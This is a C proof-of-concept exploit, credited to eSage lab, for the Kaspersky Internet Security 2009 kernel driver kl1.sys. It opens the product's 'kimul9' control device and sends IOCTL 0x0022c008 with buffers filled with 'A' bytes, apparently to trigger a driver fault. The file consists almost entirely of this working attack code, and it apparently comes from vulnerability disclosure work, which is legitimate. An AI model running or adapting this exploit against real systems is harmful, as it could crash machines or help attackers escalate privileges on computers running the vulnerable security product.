/*

    Exploit tested on Kaspersky Internet Security 2009 8.0.0.35
    kl1.sys 6.1.30.0, time stamp: 0x4805D347  (GMT: Wed Apr 16 10:21:59 2008)
    
    (x) eSage lab http://www.esagelab.ru
    mailto:dmitry@esagelab.ru
	
*/

#include "stdafx.h"
#include "ntdll.h"

#pragma comment(lib,"ntdll.lib")

#define IOCTL(_code_, _ib_, _il_, _ob_, _ol_)   \
NtDeviceIoControlFile(                          \
    hDev,                                       \
    NULL, NULL, NULL,                           \
    &StatusBlock,                               \
    (_code_),                                   \
    (PVOID)(_ib_), (DWORD)(_il_),               \
    (PVOID)(_ob_), (DWORD)(_ol_))               \
//--------------------------------------------------------------------------------------
BOOL OpenDevice(PWSTR DriverName, HANDLE *lphDevice)
{
    WCHAR DeviceName[MAX_PATH];
    HANDLE hDevice;

    if ((GetVersion() & 0xFF) >= 5) 
    {
        wcscpy(DeviceName, L"\\\\.\\Global\\");
    } 
    else 
    {
        wcscpy(DeviceName, L"\\\\.\\");
    }

    wcscat(DeviceName, DriverName);

    printf("opening %S\n", DeviceName);

    hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("CreateFile() ERROR %d\n", GetLastError());
        return FALSE;
    }

    *lphDevice = hDevice;

    return TRUE;
}
//--------------------------------------------------------------------------------------
int _tmain(int argc, _TCHAR* argv[])
{
    HANDLE hDev = NULL;
    IO_STATUS_BLOCK StatusBlock;
    NTSTATUS ns;

    if (!OpenDevice(L"kimul9", &hDev))
    {
        printf("Error while opening KIS control device (code: %d).\n", GetLastError());
        return -1;
    }

    char InBuff[0x2c], OutBuff[0x14];

    FillMemory(InBuff, sizeof(InBuff), 'A');
    FillMemory(OutBuff, sizeof(OutBuff), 'A');

    ns = IOCTL(0x0022c008, InBuff, sizeof(InBuff), OutBuff, sizeof(OutBuff));
    printf("NtDeviceIoControlFile(0x0022c008) status: 0x%.8x\n", ns);
    
    CloseHandle(hDev);

	return 0;
}
//--------------------------------------------------------------------------------------
// EoF
